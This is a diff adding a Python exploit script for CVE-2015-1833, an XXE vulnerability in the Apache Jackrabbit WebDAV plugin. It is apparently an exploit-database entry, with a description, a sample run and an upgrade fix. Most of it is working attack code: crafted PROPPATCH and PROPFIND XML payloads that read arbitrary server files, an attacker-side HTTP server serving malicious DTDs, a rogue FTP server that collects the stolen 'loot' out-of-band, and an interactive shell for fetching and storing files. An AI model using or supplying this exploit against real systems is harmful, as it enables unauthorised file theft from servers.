@@ -1,0 +1,382 @@
+#!/usr/bin/env python
+"""
+# Exploit Title: Jackrabbit WebDAV XXE
+# Date: 25-05-2015
+# Software Link: http://jackrabbit.apache.org/jcr/
+# Exploit Author: Mikhail Egorov
+# Contact: 0ang3el () gmail com
+# Website: http://0ang3el.blogspot.com
+# CVE: CVE-2015-1833
+# Category: webapps
+
+1. Description
+
+Jackrabbit WebDAV plugin use insecurely configured XML parser to parse
+incoming PROPPATCH and PROPFIND requests. As a result it is vulnerable to
+XXE attacks.
+Besides Jackrabbit JCR, WebDAV plugin is incorporated into the following
+software: Apache Sling, Adobe AEM.
+
+2. Proof of Concept
+
+Download vulnerable Apache Sling launchpad web application from here -
+https://sling.apache.org
+
+Start launchpad web application as follows:
+root@kali:~/build-sling# java -jar
+org.apache.sling.launchpad-8-SNAPSHOT-standalone.jar
+
+Launch exploit with the following command:
+root@kali:~# python cve-2015-1833.py --url http://127.0.0.1:8080/content/xxe
+--tech oob --ip 127.0.0.1
+enter command> get .
+
+loaded 210 bytes in buffer
+
+enter command> show
+
+apache-maven-3.0.5
+apache-maven-3.0.5-bin.tar.gz
+derby.log
+eclipse
+hs_err_pid5379.log
+org.apache.sling.launchpad-8-SNAPSHOT-standalone.jar
+python-workspace
+
+enter command> store /tmp/cwd.lst
+
+buffer content has been stored in file /tmp/cwd.lst
+
+enter command> exit
+root@kali:~#
+
+Exploit have three exploitation techniques:
+* inb1 - inbound XXE technique, it first writes content as attribute value
+of controllable JCR node using PROPPATCH request and then retrieves content
+using PROPFIND request
+* inb2 - same as inb1, but there is some XML magic to retrieve content that
+is not valid XML data
+* oob - out-of-bound technique, utilizes FTP hack from this blog
+http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
+Technique inb2 is the most stable. But it requires credentials of the user
+that is able to modify some JCR node. Attacker host must have "visible ip"
+which is required for communication between target and attacker's host.
+Technique oob works even with anonymous credentials. But it is not so
+stable as inb2 technique.
+Technique inb1 does not require "visible ip", but there are limitations on
+retrieved content.
+
+3. Solution:
+
+If you use Apache Jackrabbit, install version 2.10.1.
+http://www.apache.org/dist/jackrabbit/2.10.1/RELEASE-NOTES.txt
+"""
+from urllib2 import *
+import sys, string, random
+import base64
+import xml.etree.ElementTree as ET
+import BaseHTTPServer, SimpleHTTPServer
+from multiprocessing import Process, Value, Manager
+from optparse import OptionParser
+import socket, select
+
+usage= """
+    %prog --url <url> --tech inb1 [ --creds <creds> ]
+    
+    %prog --url <url> --tech inb2 --ip <ip> [ --creds <creds> --hport <hport> ]
+    
+    %prog --url <url> --tech oob --ip <ip> [ --creds <creds> --hport <hport> --fport <fport>]
+"""
+
+help_interpreter = """
+    help - print this help.
+    
+    get <dir or file> - retrieve directory listing or file content and store it inside internal buffer. You can use "." to denote current directory (e.g. use "get ." for cwd listing).
+    
+    show - show content of internal buffer.
+    
+    store <out file> - store internal buffer in file.
+    
+    exit - stop exploiting
+    """
+    
+failure_descr = """
+Possible reasons:
+    1. Inappropriate technique, try another options.
+    2. You do not have permissions to read file or list directory.
+    3. Target is not exploitable.
+"""
+    
+rand_attr = ''
+script_name = sys.argv[0].split('/')[-1]
+
+buffer_with_loot = ''
+
+url, tech, ip, creds, hport, fport = [None] * 6
+
+http_server, ftp_server = [None] * 2
+
+class HTTP_XXE():
+    def __init__(self, ip, port, fport):
+        self.port = port
+        self.ip = ip
+        self.fport = fport
+        
+    def run(self):
+        class http_handler(BaseHTTPServer.BaseHTTPRequestHandler):
+            def __init__(self, ip, fport,*args):
+                self.ip = ip
+                self.fport = fport
+                BaseHTTPServer.BaseHTTPRequestHandler.__init__(self, *args)
+                
+            def do_GET(self):
+                if "inb2" in self.path:
+                    self.send_response(200)
+                    self.send_header('Content-type','application/xml')
+                    self.end_headers()
+                    self.wfile.write('<?xml version="1.0" encoding="utf-8"?><!ENTITY all "%start;%loot;%end;">')
+                    
+                if "oob" in self.path:
+                    self.send_response(200)
+                    self.send_header('Content-type','application/xml')
+                    self.end_headers()
+                    self.wfile.write('<?xml version="1.0" encoding="utf-8"?><!ENTITY %% all "<!ENTITY &#37; send SYSTEM "ftp://%(ip)s:%(port)s/%%loot;">">%%all;' % {'ip' : self.ip, 'port' : self.fport})
+                    
+            def log_message(self, format, *args): # silent HTTP server
+                return
+                               
+        def serve(httpd):
+            while True:
+                httpd.handle_request()
+        
+        handler = lambda *args: http_handler(self.ip, self.fport, *args)    
+        httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', self.port), handler)
+        self.proc = Process(target = serve, args = (httpd,))
+        self.proc.start()
+            
+    def stop(self):
+        self.proc.terminate()
+    
+class FTP_XXE():
+    def __init__(self, port):
+        self.port = port
+        
+    def run(self):
+        class ftp_handler():
+            def __init__(self, port):
+                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                self.server.setblocking(0)
+                self.server.bind(('0.0.0.0', port))
+                self.server.listen(5)
+                
+            def serve(self, d):
+                inputs = [self.server]
+                while True:
+                    readable, writable, exceptional = select.select(inputs, [], [])
+                    
+                    for s in readable:
+                        if s is self.server:
+                            connection, client_address = s.accept()
+                            connection.setblocking(0)
+                            inputs.append(connection)
+                            
+                            connection.send("220 xxe-ftp-server\n")
+                        else:
+                            data = s.recv(1024)
+                            
+                            if not data:
+                                inputs.remove(s)
+                                continue
+                            
+                            if "USER" in data:
+                                s.send("331 password please - version check\n")
+                            else:
+                                s.send("230 more data please!\n")
+                                if not len([x for x in ["PASS","EPSV","EPRT","TYPE"] if x in data]):
+                                    d['loot'] += data
+        
+        self.d = Manager().dict()
+        self.d['loot'] = ''
+                               
+        ftpd = ftp_handler(self.port)
+        self.proc = Process(target = ftpd.serve, args=(self.d,))
+        self.proc.start()
+    
+    def stop(self):
+        self.proc.terminate()
+        
+    def clean_buf(self):
+        self.d['loot'] = ''
+        
+    def get_loot(self):
+        loot = self.d['loot']
+        
+        # clean data
+        loot = loot.replace('\r\nRETR ','/')
+        loot = loot.replace('\r\nCWD ','/')
+        loot = loot.replace('CWD ','',1)
+        loot = loot.replace('RETR ','',1)
+        
+        return loot
+            
+def exploit(url, technique, creds = 'anonymous:anonymous'):
+    
+    global buffer_with_loot, rand_attr
+    
+    requests = {
+        'inb1' : {
+            'PROPPATCH' : '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE propertyupdate [ <!ENTITY loot SYSTEM "%(file)s"> ]> <D:propertyupdate  xmlns:D="DAV:"> <D:set> <D:prop>  <%(attr_name)s>&loot;</%(attr_name)s> </D:prop> </D:set> </D:propertyupdate>',
+            'PROPFIND': '<?xml version="1.0" encoding="utf-8"?> <D:propfind xmlns:D="DAV:"> <allprop/> </D:propfind>'
+        },
+                
+        'inb2' : {
+            'PROPPATCH' : '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE propertyupdate [ <!ENTITY %% start "<![CDATA["> <!ENTITY %% loot SYSTEM "%(file)s"> <!ENTITY %% end "]]>"> <!ENTITY %% dtd SYSTEM "http://%(ip)s:%(port)s/inb2"> %%dtd; ]> <D:propertyupdate  xmlns:D="DAV:"> <D:set> <D:prop>  <%(attr_name)s>&all;</%(attr_name)s> </D:prop> </D:set> </D:propertyupdate>',
+            'PROPFIND': '<?xml version="1.0" encoding="utf-8"?> <D:propfind xmlns:D="DAV:"> <allprop/> </D:propfind>'
+        },
+                
+        'oob' : {
+            'PROPFIND': '<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE propfind [ <!ENTITY %% loot SYSTEM "%(file)s"> <!ENTITY %% dtd SYSTEM "http://%(ip)s:%(port)s/oob"> %%dtd; %%send;  ]> <D:propfind xmlns:D="DAV:"> <allprop/> </D:propfind>'
+        }
+    }
+     
+    def request(url, verb, data, creds, timeout):
+        req = Request(url, data)
+        req.add_header('User-Agent', script_name)
+        req.add_header('Content-Type', 'application/xml')
+        req.add_header('Authorization', 'Basic ' + base64.b64encode(creds))
+        req.get_method = lambda: verb
+        
+        #req.set_proxy('127.0.0.1:8081','http')  ### For debug
+        
+        resp = None
+        try:      
+            resp =  urlopen(req, timeout = timeout).read()
+        except Exception, e:
+            pass
+        
+        return resp
+        
+    while 1:
+        cmdline = raw_input('\033[33menter command> \033[0m')
+        cmdline = re.sub('\s+', ' ', cmdline)
+        cmd = cmdline.split(' ')[0]
+        arg = cmdline.split(' ')[-1]
+        
+        if cmd not in ['help', 'get', 'show', 'store', 'exit']:
+            print '\n\033[36mno such command, use help for command list \033[0m\n'
+            continue
+        
+        if cmd == 'exit':
+            break
+        
+        if cmd == 'help':
+            print '\033[36m' + help_interpreter + '\033[0m'
+            continue
+        
+        if cmd == 'show':
+            print '\n\033[36m' + buffer_with_loot + '\033[0m'
+            continue
+        
+        if cmd == 'store':
+            with open(arg,'w') as outf:
+                outf.write(buffer_with_loot)
+                
+            print '\n\033[32mbuffer content has been stored in file ' + arg + '\033[0m\n'
+            continue
+        
+        if cmd == 'get':
+            if arg.startswith('.'):
+                arg = '/proc/self/cwd' + arg[1:]
+            arg = 'file://' + arg
+            
+            rand_attr = ''.join([random.choice(string.ascii_lowercase) for i in range(10)]) ### random attribute name where we place content
+            
+            if technique == 'inb1':
+                request1 = requests['inb1']['PROPPATCH'] % {'attr_name' : rand_attr, 'file' : arg}
+                request(url, 'PROPPATCH', request1, creds, timeout = 30)
+                
+                request2 = requests['inb1']['PROPFIND']
+                loot = request(url, 'PROPFIND', request2, creds, timeout = 30)
+                
+                try:
+                    buffer_with_loot = ET.fromstring(loot).findall('.//' + rand_attr)[0].text
+                except:
+                    buffer_with_loot = ''
+                                  
+            if technique == 'inb2':
+                request1 = requests['inb2']['PROPPATCH'] % {'attr_name' : rand_attr, 'file' : arg, 'ip' : ip, 'port' : hport}
+                request(url, 'PROPPATCH', request1, creds, timeout = 30)
+                
+                request2 = requests['inb2']['PROPFIND']
+                loot = request(url, 'PROPFIND', request2, creds, timeout = 30)
+                
+                try:              
+                    buffer_with_loot = ET.fromstring(loot).findall('.//' + rand_attr)[0].text.replace('<[CDATA[','').replace(']]>','')
+                except:
+                    buffer_with_loot = ''
+                    
+            if technique == 'oob':
+                request1 = requests['oob']['PROPFIND'] % {'file' : arg, 'ip' : ip, 'port' : hport}
+                request(url, 'PROPFIND', request1, creds, timeout = 8)
+
+                buffer_with_loot = ftp_server.get_loot()
+                
+                ftp_server.clean_buf()
+                             
+            len_ = sys.getsizeof(buffer_with_loot) - sys.getsizeof('')
+            print "\n\033[32mloaded %s bytes in buffer\033[0m\n" % len_
+            if not len_:
+                print '\033[36m' + failure_descr + '\033[0m'
+                
+            continue
+
+def parse_options():
+    global url, tech, ip, creds, hport, fport
+    
+    parser = OptionParser(usage = usage)
+    parser.add_option('--url', dest = url, help = 'url parameter')
+    parser.add_option('--tech', dest = tech, help = 'technique, valid values are: inb1, inb2, oob')
+    parser.add_option('--creds', dest = creds, help = 'user credentials, default value is anonymous:anonymous')
+    parser.add_option('--ip', dest = ip, help = 'ip address of netw interface that your target is able to access')
+    parser.add_option('--hport', dest = hport, help = 'port for HTTP server which will be launched during attack, default is 9998')
+    parser.add_option('--fport', dest = fport, help = 'port for FTP server which will be launched during attack, default is 9999')
+    
+    (options, args) = parser.parse_args()
+    
+    if not options.url or not options.tech:
+        print 'you must specify url and tech parameters'
+        sys.exit(2)
+        
+    if options.tech not in ['inb1', 'inb2', 'oob']:
+        print 'invalid tech parameter'
+        sys.exit(2)
+        
+    if options.tech != 'inb1' and not options.ip:
+        print 'you must specify ip parameter'
+        sys.exit(2)
+        
+    url = options.url
+    tech = options.tech
+    ip = options.ip
+    creds = options.creds if options.creds else 'anonymous:anonymous'
+    hport = options.hport if options.hport else 9998
+    fport = options.fport if options.fport else 9999
+
+parse_options()
+
+if tech != 'inb1':  
+    http_server = HTTP_XXE(ip, hport, fport)
+    http_server.run()
+    
+    if tech == 'oob':
+        ftp_server = FTP_XXE(fport)
+        ftp_server.run()
+    
+exploit(url, tech, creds)
+
+if tech != 'inb1': 
+    http_server.stop()
+    
+if tech == 'oob':
+    ftp_server.stop()
